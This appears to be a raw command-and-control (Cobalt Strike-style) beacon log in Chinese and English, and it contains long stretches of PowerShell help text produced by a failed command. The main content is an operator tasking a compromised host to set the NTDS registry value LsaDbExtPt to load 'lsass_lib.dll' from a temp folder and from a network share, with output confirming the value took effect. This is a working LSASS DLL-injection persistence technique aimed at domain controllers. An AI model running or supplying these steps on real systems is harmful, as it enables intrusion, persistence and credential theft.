-PSConsoleFile
    加载指定的 Windows PowerShell 控制台文件。若要创建控制台
    文件，请使用 Windows PowerShell 的 Export-Console。

-Version
    启动 Windows PowerShell 的指定版本。

-NoLogo
    启动时隐藏版权标志。

-NoExit
    运行完启动命令后不退出。

-Sta
    使用单线程单元启动 shell。

-NoProfile
    不使用用户配置文件。

-NonInteractive
    不向用户显示交互式提示。

-InputFormat
    说明发送到 Windows PowerShell 的数据的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-OutputFormat
    确定 Windows PowerShell 输出内容的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-WindowStyle
    将窗口样式设置为 Normal、Minimized、Maximized 或 Hidden。

-EncodedCommand
    接受命令的 Base 64 编码字符串版本。使用此参数向
    Windows PowerShell 提交需要复杂引号或
    大括号的命令。

-File
    执行脚本文件。

-ExecutionPolicy
    设置会话的默认执行策略。

-Command
    以执行好像从 Windows PowerShell 命令提示符下键入的命令那样
    执行指定的命令和所有参数，如果未指定 NoExit，则随后将
    退出。Command 的值可以为"-"、字符串或
    脚本块。

    如果 Command 的值为"-"，则将从标准输入设备读取命令
    文本。

    如果 Command 的值为脚本块，则脚本块必须括在
    大括号({})中。只有在 Windows PowerShell 中运行 PowerShell.exe 时才能指定
    脚本块。脚本块的结果作为反序列化 XML 对象(而非活动对象)返回到
    父 shell。

    如果 Command 的值为字符串，则 Command 必须是该命令的
    最后一个形式参数，因为其后键入的所有字符都会被解释为
    它的实际参数。

    若要写运行 Windows PowerShell 命令的字符串，请使用以下格式:
	"& {<command>}"
    其中，引号指示一个字符串，调用运算符(&)
    用于执行命令。

-Help、-?、/?
    显示此消息。如果要在 Windows PowerShell 中键入
 PowerShell.exe 命令，    请以连字符(-)作为命令参数的前缀，不要使用
    正斜杠(/)。连字符和正斜杠均可用于 Cmd.exe。

示例
    PowerShell -PSConsoleFile SqlSnapIn.Psc1
    PowerShell -version 1.0 -NoLogo -InputFormat text -OutputFormat XML
    PowerShell -Command {Get-EventLog -LogName security}
    PowerShell -Command "& {Get-EventLog -LogName security}"

    # To use the -EncodedCommand parameter:
    $command = 'dir "c:\program files" '
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    powershell.exe -encodedCommand $encodedCommand


01/27 18:13:05 [task] 4*************LSA Disver************
01/27 18:13:05 [task] 添加键值 4注：本攻击基于管理员权限，请先提权
01/27 18:13:05 [task] Tasked beacon to run: Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
01/27 18:13:05 [task] Tasked beacon to run: 
01/27 18:13:45 [checkin] host called home, sent: 358 bytes
01/27 18:13:46 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services_x000D__x000A_</S><S S="Error">\NTDS 处不存在属性 LsaDbExtPt。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS _x000D__x000A_</S><S S="Error">-Name LsaDbExtPt_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (LsaDbExtPt:String) [Remove-Ite _x000D__x000A_</S><S S="Error">   mProperty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 18:13:46 [output]
received output:
无法处理命令，因为缺少参数。命令必须后跟 -Command。

PowerShell[.exe] [-PSConsoleFile <file> | -Version <version>]
    [-NoLogo] [-NoExit] [-Sta] [-NoProfile] [-NonInteractive]
    [-InputFormat {Text | XML}] [-OutputFormat {Text | XML}] 
    [-WindowStyle <style>] [-EncodedCommand <Base64EncodedCommand>] 
    [-File <filePath> <args>] [-ExecutionPolicy <ExecutionPolicy>]
    [-Command { - | <script-block> [-args <arg-array>]
                  | <string> [<CommandParameters>] } ]

PowerShell[.exe] -Help | -? | /?

-PSConsoleFile
    加载指定的 Windows PowerShell 控制台文件。若要创建控制台
    文件，请使用 Windows PowerShell 的 Export-Console。

-Version
    启动 Windows PowerShell 的指定版本。

-NoLogo
    启动时隐藏版权标志。

-NoExit
    运行完启动命令后不退出。

-Sta
    使用单线程单元启动 shell。

-NoProfile
    不使用用户配置文件。

-NonInteractive
    不向用户显示交互式提示。

-InputFormat
    说明发送到 Windows PowerShell 的数据的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-OutputFormat
    确定 Windows PowerShell 输出内容的格式。有效值可以为
    "Text"(文本字符串)，也可以为"XML"(序列化 CLIXML 格式)。

-WindowStyle
    将窗口样式设置为 Normal、Minimized、Maximized 或 Hidden。

-EncodedCommand
    接受命令的 Base 64 编码字符串版本。使用此参数向
    Windows PowerShell 提交需要复杂引号或
    大括号的命令。

-File
    执行脚本文件。

-ExecutionPolicy
    设置会话的默认执行策略。

-Command
    以执行好像从 Windows PowerShell 命令提示符下键入的命令那样
    执行指定的命令和所有参数，如果未指定 NoExit，则随后将
    退出。Command 的值可以为"-"、字符串或
    脚本块。

    如果 Command 的值为"-"，则将从标准输入设备读取命令
    文本。

    如果 Command 的值为脚本块，则脚本块必须括在
    大括号({})中。只有在 Windows PowerShell 中运行 PowerShell.exe 时才能指定
    脚本块。脚本块的结果作为反序列化 XML 对象(而非活动对象)返回到
    父 shell。

    如果 Command 的值为字符串，则 Command 必须是该命令的
    最后一个形式参数，因为其后键入的所有字符都会被解释为
    它的实际参数。

    若要写运行 Windows PowerShell 命令的字符串，请使用以下格式:
	"& {<command>}"
    其中，引号指示一个字符串，调用运算符(&)
    用于执行命令。

-Help、-?、/?
    显示此消息。如果要在 Windows PowerShell 中键入
 PowerShell.exe 命令，    请以连字符(-)作为命令参数的前缀，不要使用
    正斜杠(/)。连字符和正斜杠均可用于 Cmd.exe。

示例
    PowerShell -PSConsoleFile SqlSnapIn.Psc1
    PowerShell -version 1.0 -NoLogo -InputFormat text -OutputFormat XML
    PowerShell -Command {Get-EventLog -LogName security}
    PowerShell -Command "& {Get-EventLog -LogName security}"

    # To use the -EncodedCommand parameter:
    $command = 'dir "c:\program files" '
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    powershell.exe -encodedCommand $encodedCommand


01/27 18:14:26 [task] 4*************LSA Disver************
01/27 18:14:26 [task] 添加键值 4注：本攻击基于管理员权限，请先提权
01/27 18:14:26 [task] Tasked beacon to run: Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
01/27 18:14:26 [task] Tasked beacon to run: new-ItemProperty  -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value '"c:\temp\lsass_lib.dll","\\share\lulz\lsass_lib.dll"'
01/27 18:14:46 [checkin] host called home, sent: 750 bytes
01/27 18:14:47 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services_x000D__x000A_</S><S S="Error">\NTDS 处不存在属性 LsaDbExtPt。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS _x000D__x000A_</S><S S="Error">-Name LsaDbExtPt_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (LsaDbExtPt:String) [Remove-Ite _x000D__x000A_</S><S S="Error">   mProperty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 18:14:47 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\Cu
               rrentControlSet\Services\NTDS
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\Cu
               rrentControlSet\Services
PSChildName  : NTDS
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
LsaDbExtPt   : "c:\temp\lsass_lib.dll","\\share\lulz\lsass_lib.dll"





